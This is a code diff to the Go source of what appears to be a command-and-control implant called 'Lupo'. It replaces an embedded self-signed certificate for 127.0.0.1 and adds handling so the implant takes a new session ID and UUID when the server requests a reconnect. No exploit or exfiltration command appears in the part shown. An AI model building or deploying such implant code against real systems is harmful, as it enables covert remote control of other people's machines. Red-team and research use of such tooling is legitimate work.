@@ -34,19 +34,19 @@ type lupoImplant struct {
 var implant *lupoImplant
 
 var rootCert string = `-----BEGIN CERTIFICATE-----
-MIICaTCCAe6gAwIBAgIUSgYpszWXblTTk3otY0CH3d85yVYwCgYIKoZIzj0EAwIw
+MIICaDCCAe6gAwIBAgIUYLDpgVk6sWoVs8YncVZb1fyia48wCgYIKoZIzj0EAwIw
 XTELMAkGA1UEBhMCVVMxDTALBgNVBAgMBEx1cG8xDTALBgNVBAcMBEx1cG8xDTAL
 BgNVBAoMBEx1cG8xDTALBgNVBAsMBEx1cG8xEjAQBgNVBAMMCTEyNy4wLjAuMTAe
-Fw0yMjExMDExNzM4NDVaFw0zMjEwMjkxNzM4NDVaMF0xCzAJBgNVBAYTAlVTMQ0w
+Fw0yMjExMDQxODI1NDVaFw0zMjExMDExODI1NDVaMF0xCzAJBgNVBAYTAlVTMQ0w
 CwYDVQQIDARMdXBvMQ0wCwYDVQQHDARMdXBvMQ0wCwYDVQQKDARMdXBvMQ0wCwYD
 VQQLDARMdXBvMRIwEAYDVQQDDAkxMjcuMC4wLjEwdjAQBgcqhkjOPQIBBgUrgQQA
-IgNiAARCx2S8szYVw8tIYGaJJh0/P+q6L2Tj4dZN5CIEGbLbicqO4xjQ5J119WWi
-Z+Su8HS8kKDZmpuSHo8IaaXsUr0VxPBuU2ZiiTVBaV2Lj/q2XJdJBJgNYmIoixrC
-UeD5tLmjbzBtMB0GA1UdDgQWBBQGQmu4ALKgRoNpyOiGJOCfe6Z+bTAfBgNVHSME
-GDAWgBQGQmu4ALKgRoNpyOiGJOCfe6Z+bTAPBgNVHRMBAf8EBTADAQH/MBoGA1Ud
-EQQTMBGCCTEyNy4wLjAuMYcEfwAAATAKBggqhkjOPQQDAgNpADBmAjEAsASzICs5
-CA0s6NKgk0ia7Yk4un8C2l85bTpbYP57r8PPWE5YDqFr47SP2YJU756DAjEAwESq
-kGjJZCbE4EjSqBNtMZCtgBSJBi6KdmEnDFmwraXmQk8nUIFh8U61z7OVYeof
+IgNiAARByJuNeJHhznNJKGCnP4qfDdf2rBRpn9HMAgik1OuFY7DmcSqom52lqZa+
+SX6VZmgl+VvzaxKe6hZkpYlxPXxCIE5iNBSn0nox6mPJwIchUph2NA78MVh7h1fn
+6YWj562jbzBtMB0GA1UdDgQWBBQcYBUg4If+4KCWvwTAua9L1TuaxTAfBgNVHSME
+GDAWgBQcYBUg4If+4KCWvwTAua9L1TuaxTAPBgNVHRMBAf8EBTADAQH/MBoGA1Ud
+EQQTMBGCCTEyNy4wLjAuMYcEfwAAATAKBggqhkjOPQQDAgNoADBlAjEAiZhS4ek6
+XYNuX0v2bLC10tXwD/U/JAAj/s+ksHfS6Pe7KMSMeDmtaHzPQLGcPEAxAjBY4qv9
+Fb/3Nn0/dl3V11rvAExZ10P2PsuceIwFUu/ICj60OLhC9aTuw+jp9EbkGC0=
 -----END CERTIFICATE-----
 `
 
@@ -166,6 +166,13 @@ func ExecLoop(implant *lupoImplant, client *http.Client) {
 		err = json.Unmarshal(jsonData, &serverResponse)
 
 		if err != nil {
+			return
+		}
+
+		// In case of server side issue where we request a session reconnect, set the new session info for the implant structure
+		if serverResponse["UUID"] != nil {
+			implant.id = int(serverResponse["sessionID"].(float64))
+			implant.uuid = serverResponse["UUID"].(string)
 			return
 		}
 
